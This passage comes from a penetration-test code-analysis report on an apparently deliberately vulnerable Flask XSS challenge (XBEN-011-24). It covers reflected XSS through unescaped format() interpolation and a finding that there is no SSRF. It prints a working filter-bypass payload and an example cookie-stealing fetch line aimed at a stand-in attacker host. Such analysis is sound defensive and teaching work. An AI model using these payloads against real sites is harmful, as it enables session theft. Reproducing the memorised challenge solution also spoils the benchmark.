- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/check.js` — PhantomJS script for XSS detection via alert/confirm/prompt override
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Subprocess orchestration (line 34), temporary file handling (lines 35-50)

### Static Assets

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/css/style.css` — Main stylesheet
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/css/xss/*.css` — Challenge-specific styles
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/img/*.png` — Image assets
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/img/cookies/*.png` — Success/failure indicators
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/assets/fav-icon.png` — Favicon

---

## 9. XSS Sinks and Render Contexts

### PRIMARY XSS VULNERABILITY: Server-Side Template Injection Leading to Reflected XSS

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS) via Python `.format()` template injection

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:71-75`

**Exact Line Numbers:**
- **Line 67:** User input acquisition — `msg = request.form.get('solution','')`
- **Line 68-70:** Insufficient filtering (intentionally bypassable)
- **Line 71:** Template variable preparation — `value = "" if msg == "" else '{0}'.format(msg)`
- **Line 73:** Template injection (temporary page) — `data = CONTENT_TAG_POST.format("24", "Star", value, "", "")`
- **Line 75:** Template injection (HTTP response) — `return CONTENT_TAG_POST.format("24", "Star", value, result, "")`

**Vulnerable Code Flow:**

```python
@app.route('/page', methods=['POST', 'GET'])
def page_handler():
    msg = request.form.get('solution','')  # ← USER INPUT (no length limit)
    
    # Weak blacklist filter (allows <image> tag)
    blacklist = r'<(?!image\b)[^>]+>'
    msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
    msg = re.sub(r'\s', '', msg, flags=re.IGNORECASE | re.DOTALL)
    
    value = "" if msg == "" else '{0}'.format(msg)  # ← No escaping
    
    # User input embedded in HTML template
    data = CONTENT_TAG_POST.format("24", "Star", value, "", "")
    result = check_result(data, flags[0], msg, 'level_medium')
    
    # User input reflected in HTTP response (XSS)
    return CONTENT_TAG_POST.format("24", "Star", value, result, "")
```

**Template Structure:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/constants.py:102-124`

```html
CONTENT_TAG_POST = """
    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss{0}.css">
            <title>Dalgona - {1}</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    {4}
                    {3}
                    <input type=text name=solution placeholder="Enter solution...">
                    {2}    <!-- ← USER INPUT INJECTED HERE WITHOUT ESCAPING -->
                </form>
            </div>
        </div>
    </html>
"""
```

**Exact Injection Point:**
- **Template Line:** 119 (parameter `{2}` in the template string)
- **Context:** HTML Body, directly after the input field
- **Parent Element:** `<form class="box-form" method="post">`
- **Render Context:** HTML Body Context (not within attribute, script, or style tag)

**User Input Source:**
- **HTTP Method:** POST (or GET, though uncommon)
- **Parameter Name:** `solution`
- **Retrieval:** `request.form.get('solution','')`
- **Content-Type:** `application/x-www-form-urlencoded` (Flask default, not enforced)
- **Encoding:** UTF-8 (assumed, not validated)

**XSS Sink Classification:**

**Sink Type:** HTML Body Context via Server-Side Template Injection

**Render Context Details:**
- **Context:** HTML Body (between `<form>` tags)
- **Depth:** Inside `<form>` → `<div class="box">` → `<div class="widget__content">` → `<article class="widget__login">` → `<html>`
- **Escaping Applied:** NONE—direct string interpolation without HTML entity encoding
- **Auto-Escaping:** NONE—Python `.format()` does not auto-escape, unlike Jinja2's `{{ variable }}` syntax

**Required Escaping (Missing):**
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#x27;` or `&apos;`

**Exploitation Technique:**

**Primary Bypass Vector:** `<image>` tag with event handler

**Payload Example:**
```html
<image src=x onerror=alert('XSS')>
```

**Payload Explanation:**
1. `<image>` tag is **explicitly allowed** by blacklist regex `r'<(?!image\b)[^>]+>'`
2. `src=x` provides invalid image source, triggering `onerror` handler
3. `onerror=alert('XSS')` executes JavaScript when image fails to load
4. Whitespace removal is circumvented by using no spaces (or using HTML entities if needed)

**Challenge Constraint:**
The PhantomJS validation script (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/check.js:9-16`) expects the payload to trigger `alert('XSS')`, `confirm('XSS')`, or `prompt('XSS')` specifically. Other XSS payloads (e.g., `<image src=x onerror=fetch('//attacker.com?cookie='+document.cookie)>`) would execute JavaScript but fail validation because they don't call the expected functions.

**Network Accessibility Confirmation:**
- ✅ **In Scope:** Endpoint `/page` is network-accessible via HTTP POST/GET on port 5000
- ✅ **Deployed Surface:** Flask application runs in Docker container exposed via docker-compose
- ✅ **Public Access:** No authentication required, anyone can submit XSS payloads

**Attack Surface Analysis:**
- **Entry Point:** POST `/page` with parameter `solution`
- **Attack Vector:** Reflected XSS via template injection
- **Objective:** Bypass blacklist filter to inject XSS payload triggering `alert('XSS')`
- **Success Condition:** PhantomJS detects XSS, application returns flag in HTTP response

---

### SECONDARY XSS RISK: Insufficient Escaping in Error Messages

**Vulnerability Type:** Potential Reflected XSS via insufficient `cgi.escape()` usage

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:58`

**Exact Line Number:** 58

**Vulnerable Code:**

```python
data = '<div class="solution-text"><img src="{0}" alt="Fail" width="150" height="150"><br>Oops! You got {1} instead of the expected value</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```

**Vulnerability Analysis:**

**User Input Source (Indirect):**
- The `result` variable comes from PhantomJS stdout: `result = proc.stdout.readline().strip()` (line 45)
- PhantomJS processes user-controlled HTML, and its output could potentially contain attacker-controlled data
- However, PhantomJS should only output "XSS" on success or benign error messages on failure

**Escaping Applied:**
- `cgi.escape(result)` is used on line 58
- `cgi.escape()` by default escapes: `<`, `>`, `&`
- `cgi.escape()` does **NOT** escape quotes by default (requires `quote=True` parameter)

**Render Context:**
- **Context:** HTML Body within `<div>` element
- **Injection Point:** After "Oops! You got " text
- **Parent Element:** `<div class="solution-text">`

**Exploitability Assessment:**
- **Severity:** LOW (indirect, dependent on PhantomJS behavior)
- **Likelihood:** LOW (PhantomJS unlikely to reflect attacker-controlled content in stdout)
- **Impact:** If exploitable, could inject HTML/JavaScript in error messages
- **Network Accessible:** ✅ Yes (response from `/page` endpoint)

**Recommended Fix:**
```python
# Use quote=True to escape quotes
data = '...{1}...'.format(..., cgi.escape(result, quote=True))
# Or better: use Jinja2 auto-escaping
```

---

### XSS SINKS NOT FOUND

The following common XSS sink categories were searched but **NOT FOUND in network-accessible code**:

#### HTML Body Context Sinks (Beyond Template Injection)
- ❌ `innerHTML` assignments — None found
- ❌ `outerHTML` assignments — None found
- ❌ `document.write()` — None found
- ❌ `document.writeln()` — None found
- ❌ `insertAdjacentHTML()` — None found
- ❌ `Range.createContextualFragment()` — None found
- ❌ jQuery DOM manipulation (`.html()`, `.append()`, `.after()`, etc.) — No jQuery usage detected

**Rationale:** The application uses server-side rendering only, no client-side DOM manipulation

#### HTML Attribute Context Sinks
- ❌ Event handler attributes set dynamically (`element.onclick = ...`) — None found
- ❌ URL-based attributes set dynamically (`element.href = ...`) — None found
- ❌ Style attribute manipulation (`element.style = ...`) — None found
- ❌ Iframe `srcdoc` attribute — None found

**Rationale:** No client-side JavaScript modifies attributes

#### JavaScript Context Sinks
- ❌ `eval()` — Not found in application code (PhantomJS check.js uses it, but not network-accessible)
- ❌ `Function()` constructor — Not found
- ❌ `setTimeout(string)` — PhantomJS uses `setTimeout(function)` with callbacks, not strings (line 24, 38 in check.js)
- ❌ `setInterval(string)` — Not found

**Rationale:** Application has minimal JavaScript, PhantomJS script uses safe patterns

#### CSS Context Sinks
- ❌ `element.style` property assignment — Not found
- ❌ Dynamic `<style>` tag content — Not found
- ❌ CSS injection via style attributes — Not found

#### URL Context Sinks
- ❌ `location.href = userInput` — Not found
- ❌ `window.open(userInput)` — Not found
- ❌ `history.pushState(userInput)` — Not found
- ❌ `window.location = userInput` — Not found

#### jQuery Selector Sinks
- ❌ `$(userInput)` — No jQuery usage detected

---

### SUMMARY: XSS Attack Surface

**Total XSS Sinks Identified:** 1 primary, 1 secondary (low risk)

**Primary Attack Vector:**
- **Endpoint:** POST `/page`
- **Parameter:** `solution`
- **Sink:** Python `.format()` template injection at line 71-75
- **Context:** HTML Body
- **Bypass:** `<image src=x onerror=alert('XSS')>`
- **Severity:** CRITICAL (intentional vulnerability for CTF)

**Defensive Controls (All Missing):**
- ❌ Content Security Policy (CSP)
- ❌ X-XSS-Protection header
- ❌ Input validation (only weak blacklist)
- ❌ Output encoding (no HTML entity escaping)
- ❌ Template auto-escaping (not using Jinja2 properly)
- ❌ Context-aware encoding

---

## 10. SSRF Sinks

### COMPREHENSIVE SSRF SINK ANALYSIS

After exhaustive analysis of the XBEN-011-24 codebase, **NO EXPLOITABLE SSRF (Server-Side Request Forgery) SINKS** were identified in network-accessible code. The application's architecture includes PhantomJS-based server-side rendering, but the URL passed to PhantomJS is **hardcoded to localhost with a randomly-generated filename**, preventing user control over the request destination.

---

### EVALUATED COMPONENT: PhantomJS Page Navigation (NOT EXPLOITABLE)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:33-50`

**Component Type:** Headless browser (PhantomJS) server-side rendering

**Code Analysis:**

```python
def check_result(page,flag,msg,tag):
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                            stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    fn = "static/" + os.urandom(16).encode('hex') + '.html'  # ← RANDOM FILENAME
    url = 'http://localhost:5000/' + fn  # ← HARDCODED LOCALHOST URL
    try:
        of = open(fn, 'w')
        of.write(page)  # ← User controls HTML CONTENT, not URL
        of.close()
        print "Page:"
        print page
        proc.stdin.write(url)  # ← Writes hardcoded URL to PhantomJS stdin
        proc.stdin.close()
        result = proc.stdout.readline().strip()
        return result
    finally:
        os.unlink(fn)  # ← Temporary file cleanup
```

**PhantomJS Navigation (check.js):** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/check.js:18-22`

```javascript
var input = system.stdin.readLine();
var page = require("webpage").create();
page.open(input, function(status) {  // ← Loads URL from stdin
    if (status === "success") {
        setTimeout(function() { phantom.exit(); }, 2000);
    } else {
        phantom.exit();
    }
});
```

**User Input Control Analysis:**

| Component | User Controllable? | Explanation |
|-----------|-------------------|-------------|
| Protocol (`http://`) | ❌ NO | Hardcoded in app.py:36 |
| Hostname (`localhost`) | ❌ NO | Hardcoded in app.py:36 |
| Port (`5000`) | ❌ NO | Hardcoded in app.py:36 |
| Path (`/static/`) | ❌ NO | Hardcoded in app.py:36 |
| Filename | ❌ NO | Randomly generated via `os.urandom(16).encode('hex')` (128 bits entropy) |
| HTML Content | ✅ YES | User input embedded in HTML via template injection (XSS vector, not SSRF) |

**SSRF Exploitability Assessment:**

- **URL Control:** ❌ NONE—user cannot influence any component of the URL
- **SSRF Risk:** ❌ NOT EXPLOITABLE—PhantomJS always navigates to `http://localhost:5000/static/<random>.html`
- **Attack Vector:** The user can control the **HTML content** of the file PhantomJS loads, enabling XSS, but cannot redirect PhantomJS to external URLs or internal services
- **Potential Misunderstanding:** While this is "server-side request forgery" in the literal sense (server making requests on behalf of user), it is NOT an SSRF vulnerability because the destination is not user-controllable

**Data Flow:**
```
User Input (POST solution parameter) 
  → Filtered by regex 
  → Injected into HTML template 
  → Written to /static/<random>.html 
  → PhantomJS opens http://localhost:5000/static/<random>.html (FIXED URL)
  → XSS detection
```

**Network Accessibility:** ✅ **IN SCOPE** (triggered via POST `/page`)

**Security Implication:**
- This is the **XSS validation mechanism**, not an SSRF vector
- If the URL were user-controllable (e.g., `url = request.form.get('target_url')`), this would be a **CRITICAL SSRF vulnerability**
- As implemented, PhantomJS can only access the local Flask application, not external services or internal infrastructure

---

### SSRF SINK CATEGORIES EVALUATED (ALL NOT FOUND)

#### 1. HTTP(S) Clients

**Searched For:**
- Python `requests` library: `requests.get()`, `requests.post()`, `requests.request()`, `requests.Session()`
- Python `urllib`: `urllib.request.urlopen()`, `urllib2.urlopen()`, `urllib.urlopen()`
- Python `urllib3`: `urllib3.PoolManager()`, `http.request()`
- Python `http.client`: `HTTPConnection`, `HTTPSConnection`
- `curl` subprocess calls with user-controlled URLs
- `wget` subprocess calls with user-controlled URLs

**Result:** ❌ **NOT FOUND**

**Evidence:**
- **Import Statement:** `import urllib` at line 13 of app.py
- **Usage:** ❌ **NEVER USED**—no calls to `urllib.urlopen()`, `urllib.request()`, or any urllib functions in the codebase
- **Search Confirmation:** Searched all `.py` files for `urllib`, `requests`, `httplib`, `http.client`, `curl`, `wget` with no user-controllable URL parameters

#### 2. Raw Sockets & Connect APIs

**Searched For:**
- Python `socket.connect()`
- `socket.socket()` with connect operations
- `socket.create_connection()`
- TCP/UDP socket operations

**Result:** ❌ **NOT FOUND**

**Evidence:** No socket imports or socket operations detected in application code

#### 3. URL Openers & File Includes

**Searched For:**
- Python `open()` with URLs (e.g., `open('http://...')`)
- `file_get_contents()` (PHP, not applicable)
- Dynamic `import()` or `__import__()` with user-controlled paths
- `exec()`, `eval()` with file loading

**Result:** ❌ **NOT FOUND**

**Evidence:**
- `open()` used only for local file operations (`open(fn, 'w')` at line 37, `open('secret.txt')` at line 22)
- No file inclusion with URLs detected

#### 4. Redirect & Next URL Handlers

**Searched For:**
- Flask `redirect()` with user-controlled URLs
- `response.redirect()`
- "next", "return_url", "continue_to" request parameters
- Location header manipulation

**Result:** ❌ **NOT FOUND**

**Evidence:**
- No `redirect()` imports or usage
- No query parameters handling for redirects
- No Location header setting in responses

#### 5. Headless Browsers & Render Engines (EVALUATED ABOVE)

**Found:** PhantomJS `page.open()` at check.js:20

**User Control:** ❌ NONE—URL is hardcoded

**Result:** ✅ **NOT EXPLOITABLE FOR SSRF** (see detailed analysis above)

#### 6. Media Processors

**Searched For:**
- ImageMagick (`convert`, `identify` commands with URLs)
- GraphicsMagick
- FFmpeg with network sources
- wkhtmltopdf with URL inputs
- PIL/Pillow with URL loading

**Result:** ❌ **NOT FOUND**

**Evidence:** No image processing libraries or subprocesses detected

#### 7. Link Preview & Unfurlers

**Searched For:**
- oEmbed endpoint fetchers
- OpenGraph metadata fetchers
- Social media card generators
- URL metadata extraction

**Result:** ❌ **NOT FOUND**

**Evidence:** No link preview functionality detected

#### 8. Webhook Testers & Callback Verifiers

**Searched For:**
- "Ping webhook" endpoints
- Callback URL parameters
- Webhook delivery endpoints
- Health check notification systems

**Result:** ❌ **NOT FOUND**

**Evidence:** No webhook handling detected

#### 9. SSO/OIDC/JWKS Fetchers

**Searched For:**
- OpenID Connect discovery (`/.well-known/openid-configuration` fetching)
- JWKS endpoint fetchers (`requests.get(jwks_uri)`)
- OAuth authorization server metadata
- SAML metadata retrieval

**Result:** ❌ **NOT FOUND**

**Evidence:** No authentication providers, no OAuth/OIDC integration

#### 10. Importers & Data Loaders

**Searched For:**
- "Import from URL" functionality
- CSV/JSON/XML remote loaders
- RSS/Atom feed parsers
- API data synchronization

**Result:** ❌ **NOT FOUND**

**Evidence:** No data import functionality detected

#### 11. Package/Plugin/Theme Installers

**Searched For:**
- "Install from URL" features
- Package managers with remote sources
- Plugin downloaders
- Theme installers

**Result:** ❌ **NOT FOUND**

**Evidence:** No plugin/package installation system detected

#### 12. Cloud Metadata Access

**Searched For:**
- `169.254.169.254` references (AWS/GCP/Azure metadata endpoint)
- Cloud SDK API calls (`boto3`, `google-cloud`, `azure-sdk`)
- Instance metadata fetchers

**Result:** ❌ **NOT FOUND**

**Evidence:** No cloud provider SDKs or metadata endpoint references

---

### SUMMARY: SSRF Attack Surface

**Total SSRF Sinks Identified:** 0 (NONE)

**Evaluated Components:**
- ✅ PhantomJS `page.open()` — NOT EXPLOITABLE (hardcoded localhost URL)

**HTTP Client Libraries Present But Unused:**
- `import urllib` at line 13 — IMPORTED BUT NEVER CALLED

**Network Accessibility:**
- Application is network-accessible via port 5000
- However, no network-accessible endpoints accept user-controlled URLs for server-side requests

**SSRF Risk Assessment:**
- **Current Risk:** ❌ NONE—no exploitable SSRF vectors
- **Architectural Limitation:** Application is designed for XSS challenge, not URL-based functionality
- **Potential Future Risk:** If developers add functionality to fetch external URLs (e.g., link preview, webhook testing), SSRF vulnerabilities could be introduced

**Security Recommendation for Hypothetical SSRF Protection:**

If URL fetching were to be added in the future, implement:
1. **URL Allowlisting:** Only permit specific domains (e.g., `allowed_domains = ['example.com']`)
2. **Protocol Restriction:** Block `file://`, `gopher://`, `dict://`, only allow `http://` and `https://`
3. **IP Blocklisting:** Block private IP ranges (RFC 1918), loopback (`127.0.0.1`, `::1`), link-local (`169.254.0.0/16`), metadata endpoints (`169.254.169.254`)
4. **DNS Rebinding Protection:** Resolve URL twice, verify IP doesn't change between requests
5. **Request Timeout:** Enforce short timeouts (e.g., 5 seconds) to prevent slowloris attacks
6. **Redirect Following:** Disable auto-follow redirects or validate redirect targets against same rules
7. **Network Segmentation:** Run application in isolated network with egress filtering

**Example Secure Implementation (NOT present in current code):**

```python
import requests
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['safe-domain.com']
BLOCKED_IPS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]

def safe_fetch(url):
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Resolve IP and check against blocklist
    ip = socket.gethostbyname(parsed.hostname)
    ip_obj = ipaddress.ip_address(ip)
    for blocked_net in BLOCKED_IPS:
        if ip_obj in blocked_net:
            raise ValueError("IP address blocked")
    
    # Make request with timeout
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.content
```

---

**CONCLUSION:** The XBEN-011-24 application has **NO SSRF vulnerabilities** in its current implementation. The PhantomJS-based XSS validation mechanism uses hardcoded URLs exclusively, preventing any server-side request forgery attack vectors. The application is purpose-built for XSS challenge scenarios and does not implement URL-fetching functionality that could introduce SSRF risks.

---

**END OF CODE ANALYSIS DELIVERABLE**
